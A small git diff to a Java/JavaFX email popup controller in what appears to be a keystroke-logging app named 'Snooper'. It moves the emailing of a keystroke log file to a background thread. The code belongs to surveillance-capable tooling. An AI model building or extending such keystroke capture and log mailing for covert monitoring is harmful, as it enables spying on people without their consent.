@@ -7,6 +7,7 @@ import java.io.*;
 import com.snooper.tray.*;
 
 import com.snooper.*;
+import com.snooper.app.*;
 
 public class EmailPopupController extends Controller {
 	
@@ -15,7 +16,6 @@ public class EmailPopupController extends Controller {
 	@FXML private Button sendEmailButton;
 	
 	private SLogFile sLogFile;
-	private boolean isTemp = false;
 	
 	@FXML
 	public void initialize() {
@@ -25,24 +25,8 @@ public class EmailPopupController extends Controller {
 	@FXML
 	private void sendEmail() {
 		String email = emailTextField.getText();
-		if (Util.isEmailValid(email)) {
-			if (sLogFile.isTemp()) {
-				isTemp = true;
-				
-				File orig = Snooper.getInstance().getKeyStrokesFile();
-				sLogFile.copyTo(orig);
-				
-				sLogFile = new SLogFile(orig);
-			}
-			
-			Util.sendEmailSnoopLog(email, sLogFile);
-			
-			if (isTemp) {
-				sLogFile.getFile().delete();
-			}
-			
-			stage.close();
-		}
+		new Thread(new SendEmailTask(email,sLogFile)).start();
+		stage.close();
 	}
 	
 	@Override
